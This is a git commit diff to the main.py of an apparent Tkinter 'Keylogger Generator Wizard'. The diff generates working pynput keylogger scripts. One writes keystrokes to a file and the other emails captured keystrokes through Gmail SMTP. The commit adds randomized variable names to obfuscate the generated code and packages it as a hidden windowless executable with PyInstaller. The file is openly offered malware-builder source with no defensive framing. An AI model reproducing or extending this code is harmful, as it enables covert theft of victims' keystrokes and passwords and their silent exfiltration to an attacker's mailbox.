f6cc4c8c61232a259aaf930403c4e8ebcdfecc39
j4ckrisz <114130036+j4ckrisz@users.noreply.github.com>
2024-07-27 16:52:01 -0500

    Update main.py

--- app/main.py
+++ app/main.py
@@ -1,117 +1,130 @@
 import tkinter as tk
-from tkinter import ttk
 from tkinter import messagebox
 import subprocess
+from datetime import datetime
+import random
+import string
 from PIL import Image, ImageTk
 
+def generate_random_string(length=8):
+    return ''.join(random.choices(string.ascii_letters, k=1) + random.choices(string.ascii_letters + string.digits, k=length-1))
+
 def save_input_email_keylogger():
-    global entry_1, entry_2
-    
-    # Get the input from the textboxes
     user_input_1 = entry_1.get()
     user_input_2 = entry_2.get()
     
     question_email_1 = messagebox.askyesno("Verify", f"Verify the information:\nEmail: {user_input_1}\nApp-Password: {user_input_2}")
 
     if question_email_1:
-        global saved_input_1, saved_input_2
-        saved_input_1 = user_input_1
-        saved_input_2 = user_input_2
+
+        # Generate a unique identifier based on the current date and time
+        unique_id = datetime.now().strftime("%Y%m%d%H%M%S")
+        script_filename = f'email-keylogger-{unique_id}.py'
+        
+        # Generate random variable names
+        email_var = generate_random_string()
+        password_var = generate_random_string()
+        log_var = generate_random_string()
+        send_log_func = generate_random_string()
+        on_press_func = generate_random_string()
+        listener = generate_random_string()
+        key = generate_random_string()
+        time_lib = generate_random_string()
+
 
         # Generate keylogger script       
-        with open('email-keylogger.py', 'w') as eKeylog:
+        with open(script_filename, 'w') as eKeylog:
+            eKeylog.write(f"""import smtplib
+import time as {time_lib}
+from pynput.keyboard import Listener as {listener}
 
-            eKeylog.write("""import smtplib
-import time
-import yaml
-from pynput.keyboard import Listener
+{email_var} = '{user_input_1}'
+{password_var} = '{user_input_2}'
 
-email = '{}'
-password = '{}'
+{log_var} = ""
 
-log = ""
-
-def send_log():
-    global log
-    if log:
+def {send_log_func}():
+    global {log_var}
+    if {log_var}:
         try:
             server = smtplib.SMTP('smtp.gmail.com', 587)
             server.starttls()
-            server.login(email, password)
-            server.sendmail(email, email, log)
+            server.login({email_var}, {password_var})
+            server.sendmail({email_var}, {email_var}, {log_var})
             server.quit()
         except Exception as e:
             print(f"Failed to send email: {{e}}")
-        log = ""
+        {log_var} = ""
 
-def on_press(key):
-    global log
-    log += str(key)
-    if len(log) > 100:  # Send email if log length exceeds 100 characters
-        send_log()
+def {on_press_func}({key}):
+    global {log_var}
+    {log_var} += str({key})
+    if len({log_var}) > 100:  # Send email if log length exceeds 100 characters
+        {send_log_func}()
 
-with Listener(on_press=on_press) as listener:
+with {listener}(on_press={on_press_func}) as {listener}:
     while True:
-        time.sleep(60)
-        send_log()
-        listener.join()
-""".format(saved_input_1, saved_input_2))
+        {time_lib}.sleep(60)
+        {send_log_func}()
+        {listener}.join()""")
 
-        messagebox.showinfo("Info", "The program has generated a script for you :) ")
+        messagebox.showinfo("Info", f"The program has generated a script for you: {script_filename}")
 
-        convert_to_exe('email-keylogger.py')
-
-    else:
-        pass
+        convert_to_exe(script_filename)
 
 def on_button_click_email_keylogger():
     global entry_1, entry_2
 
     disable_other_buttons("email")
 
-    tk.Label(root, text="Type your Gmail address", font=("Helvetica", 10), bg="#f0f0f0").place(relx=0.6, rely=0.3, anchor="center")
+    tk.Label(root, text="Type your Gmail address", font=("Helvetica, 10")).place(relx=0.6, rely=0.3, anchor="center")
     entry_1 = tk.Entry(root, width=30)
     entry_1.place(relx=0.6, rely=0.4, anchor="center")
 
-    tk.Label(root, text="Enter your app-password", font=("Helvetica", 10), bg="#f0f0f0").place(relx=0.6, rely=0.5, anchor="center")
+    tk.Label(root, text="Enter your app-password", font=("Helvetica, 10")).place(relx=0.6, rely=0.5, anchor="center")
     entry_2 = tk.Entry(root, width=30)
     entry_2.place(relx=0.6, rely=0.6, anchor="center")
 
-    save_button_email_keylogger = tk.Button(root, text="Generate", font=("Helvetica", 10), command=save_input_email_keylogger, bg="white", fg="black")
+    save_button_email_keylogger = tk.Button(root, text="Generate", font=("Helvetica, 10"),command=save_input_email_keylogger)
     save_button_email_keylogger.place(relx=0.6, rely=0.7, anchor="center")
 
-
 def on_button_click_simple_keylogger():
-    
     disable_other_buttons("simple")
+    
+    # Generate a unique identifier based on the current date and time
+    unique_id = datetime.now().strftime("%Y%m%d%H%M%S")
+    script_filename = f'simple-keylogger-{unique_id}.py'
 
-    with open('simple-keylogger.py', 'w') as SKeylog:
-        SKeylog.write("""from pynput.keyboard import Listener
+    # Generate random variable names
+    writetofile_func = generate_random_string()
+    keydata_var = generate_random_string()
+    keylog_var = generate_random_string()
+    keylogtextfile = generate_random_string()
+    listener = generate_random_string()
+    key = generate_random_string()
 
-def writetofile(key):
-    keydata = str(key)
-    with open('keylogfile.txt', 'a') as keylog:
-        keylog.write(keydata)
+    with open(script_filename, 'w') as SKeylog:
+        SKeylog.write(f"""from pynput.keyboard import Listener as {listener}
+def {writetofile_func}({key}):
+    {keydata_var} = str({key})
+    with open('{keylogtextfile}.txt', 'a') as {keylog_var}:
+        {keylog_var}.write({keydata_var})
 
-with Listener(on_press=writetofile) as l:
-    l.join()
+with {listener}(on_press={writetofile_func}) as {listener}:
+    {listener}.join()
 """)
         
-    messagebox.showinfo("Info", f" Simple keylogger has been successfully created !!")
+    messagebox.showinfo("Info", f"Simple keylogger has been successfully created: {script_filename}")
 
-    convert_to_exe('simple-keylogger.py')
+    convert_to_exe(script_filename)
     enable_buttons("end")
 
 def convert_to_exe(script_name):
-
     response = messagebox.askyesno("Convert to EXE", f"Do you want to convert {script_name} to an executable (EXE) file?")
     
     if response:
         subprocess.run(['python', '-m', 'PyInstaller', '--onefile', '--noconsole', script_name])        
-        messagebox.showinfo("Info", f"{script_name} has been successfully converted to exe :) ")
-
-    else:
-        pass
+        messagebox.showinfo("Info", f"{script_name} has been successfully converted to exe :)")
 
 def disable_other_buttons(selected_button):
     if selected_button == "simple":
@@ -143,11 +156,11 @@ bg_label.place(relwidth=1, relheight=1)
 # --- Keylogger Wizard Widgets --- 
 tk.Label(root, text="Keylogger Generator Wizard", font=('Helvetica', 12), bg="#f0f0f0").place(relx=0.5, rely=0.1, anchor="center")
 
-# Simple Keylogger Widgets
+# - Simple Keylogger Widgets -
 keylogger_button_1 = tk.Button(root, text="Simple Keylogger", font=('Helvetica', 10), command=on_button_click_simple_keylogger, bg="white", fg="black")
 keylogger_button_1.place(relx=0.3, rely=0.2, anchor="center")
 
-# Email Keylogger Widgets
+# - Email Keylogger Widgets -
 keylogger_button_2 = tk.Button(root, text="Email Keylogger", font=('Helvetica', 10), command=on_button_click_email_keylogger, bg="white", fg="black")
 keylogger_button_2.place(relx=0.6, rely=0.2, anchor="center")
 
